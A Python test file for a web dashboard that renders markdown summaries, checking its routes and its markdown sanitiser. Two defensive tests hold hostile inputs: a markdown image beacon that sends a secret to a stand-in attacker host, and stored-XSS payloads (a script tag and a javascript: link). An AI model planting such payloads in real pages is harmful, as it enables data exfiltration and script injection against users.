import json
from types import SimpleNamespace

from fastapi.testclient import TestClient

from distill.library import Library
from distill.web.routes.channels import _collect_videos
from distill.web.server import create_app, run_server


def test_markdown_filter_strips_img_beacons(config):
    # Exfiltration guard: an injected markdown image must not survive into the
    # rendered HTML (it would auto-load as a zero-click beacon on page view).
    app = create_app(config)
    md = app.state.templates.env.filters["markdown"]
    out = md("Lead text ![x](https://attacker.test/leak?d=secret) trailing text")
    assert "<img" not in out
    assert "attacker.test" not in out
    assert "Lead text" in out and "trailing text" in out


def test_create_app_registers_routes_and_filters(config):
    app = create_app(config)

    assert app.state.config is config
    assert "markdown" in app.state.templates.env.filters
    paths = {route.path for route in app.routes}
    assert "/" in paths
    assert "/topics" in paths
    assert "/watchlist" in paths
    assert "/costs" in paths


def test_web_routes_render_dashboard_topic_channel_video_and_watchlist(config):
    lib = Library(config)
    lib.add_channel("ai", "https://www.youtube.com/@TestChannel", "TestChannel")
    lib.add_to_topic_watchlist("ai-daily", "AI daily", topic="ai")

    video_dir = config.video_dir("ai", "TestChannel", "vid001")
    video_dir.mkdir(parents=True, exist_ok=True)
    (video_dir / "metadata.json").write_text(
        json.dumps({"title": "Test Video", "upload_date": "20260401"}),
        encoding="utf-8",
    )
    (video_dir / "transcript.txt").write_text("Transcript", encoding="utf-8")
    (video_dir / "insights.md").write_text("# Insight", encoding="utf-8")

    channel_dir = config.channel_dir("ai", "TestChannel")
    (channel_dir / "synthesis.md").write_text("# Channel Synthesis", encoding="utf-8")
    (channel_dir / "channel_context.md").write_text("Channel context", encoding="utf-8")

    topic_dir = config.topic_dir("ai")
    topic_dir.mkdir(parents=True, exist_ok=True)
    (topic_dir / "topic_synthesis.md").write_text("# Topic Synthesis", encoding="utf-8")
    (topic_dir / "brief.md").write_text("# Brief", encoding="utf-8")

    site_page_dir = config.sites_dir("ai") / "example.com" / "pages" / "page-1"
    site_page_dir.mkdir(parents=True, exist_ok=True)
    (site_page_dir / "content.md").write_text("# Site Content", encoding="utf-8")

    paper_dir = config.papers_dir("ai") / "paper-1"
    paper_dir.mkdir(parents=True, exist_ok=True)
    (paper_dir / "paper.md").write_text("# Paper", encoding="utf-8")
    (paper_dir / "metadata.json").write_text(json.dumps({"title": "Paper Title"}), encoding="utf-8")

    (config.library_dir / "cost_log.jsonl").write_text(
        json.dumps(
            {
                "timestamp": "2026-04-20T12:00:00",
                "command": "learn",
                "actual_cost": 0.4,
                "metadata": {"topic": "ai", "source_type": "youtube"},
            }
        ),
        encoding="utf-8",
    )

    client = TestClient(create_app(config))

    dashboard_response = client.get("/")
    watchlist_response = client.get("/watchlist")
    topics_response = client.get("/topics")

    assert dashboard_response.status_code == 200
    assert "Distill Dashboard" in dashboard_response.text
    assert "ai-daily" in watchlist_response.text
    assert "ai" in topics_response.text
    topic_html = client.get("/topics/ai").text
    assert "Topic Synthesis" in topic_html
    assert "Paper Title" in topic_html

    channel_html = client.get("/topics/ai/channels/TestChannel").text
    assert "Channel Synthesis" in channel_html
    assert "Test Video" in channel_html

    video_html = client.get("/topics/ai/channels/TestChannel/videos/vid001").text
    assert "Transcript" in video_html
    assert "Insight" in video_html

    costs_html = client.get("/costs").text
    assert "$0.40" in costs_html or "0.4" in costs_html


def test_create_app_fallback_markdown_filter_and_run_server(monkeypatch, config):
    import builtins

    real_import = builtins.__import__

    def fake_import(name, *args, **kwargs):
        if name == "markdown":
            raise ImportError("missing markdown")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    app = create_app(config)
    fallback_html = app.state.templates.env.filters["markdown"]("<tag>")
    assert fallback_html == "<pre>&lt;tag&gt;</pre>"

    opened = []
    started = []
    monkeypatch.setattr("distill.web.server.create_app", lambda cfg: SimpleNamespace(name="app"))
    monkeypatch.setattr("distill.web.server.webbrowser.open", lambda url: opened.append(url))

    class FakeTimer:
        def __init__(self, _delay, callback):
            self.callback = callback

        def start(self):
            self.callback()

    monkeypatch.setattr("distill.web.server.threading.Timer", FakeTimer)
    monkeypatch.setattr(
        "distill.web.server.uvicorn.run",
        lambda app, host, port, log_level: started.append((app, host, port, log_level)),
    )

    run_server(config, "127.0.0.1", 8899, open_browser=True)

    assert opened == ["http://127.0.0.1:8899"]
    assert started == [(SimpleNamespace(name="app"), "127.0.0.1", 8899, "warning")]


def test_channel_video_collection_handles_missing_and_invalid_metadata(tmp_path):
    from distill.config import DistillConfig

    config = DistillConfig(distill_output_dir=tmp_path / "lib")
    assert _collect_videos(config, "ai", "Creator") == []

    videos_dir = config.videos_dir("ai", "Creator")
    videos_dir.mkdir(parents=True, exist_ok=True)
    (videos_dir / "note.txt").write_text("ignore", encoding="utf-8")
    (videos_dir / "video-no-meta").mkdir()
    broken_dir = videos_dir / "video-bad-meta"
    broken_dir.mkdir()
    (broken_dir / "metadata.json").write_text("{bad json", encoding="utf-8")

    assert _collect_videos(config, "ai", "Creator") == []


def test_dashboard_route_falls_back_to_dev_version(monkeypatch, config):
    import importlib.metadata

    monkeypatch.setattr(
        importlib.metadata, "version", lambda _name: (_ for _ in ()).throw(RuntimeError("boom"))
    )

    client = TestClient(create_app(config))

    response = client.get("/")
    assert response.status_code == 200
    assert "dev" in response.text


def test_markdown_filter_sanitizes_untrusted_html(config):
    # Artifact bodies come from untrusted sources; the dashboard renders them as
    # |markdown|safe, so the filter must strip active HTML to avoid stored XSS.
    app = create_app(config)
    md = app.state.templates.env.filters["markdown"]
    out = md("# Title\n\n<script>alert(1)</script>\n\n[x](javascript:alert(1))\n\n**bold**")
    assert "<script" not in out
    assert "javascript:" not in out
    assert "<strong>" in out  # legitimate markdown still rendered
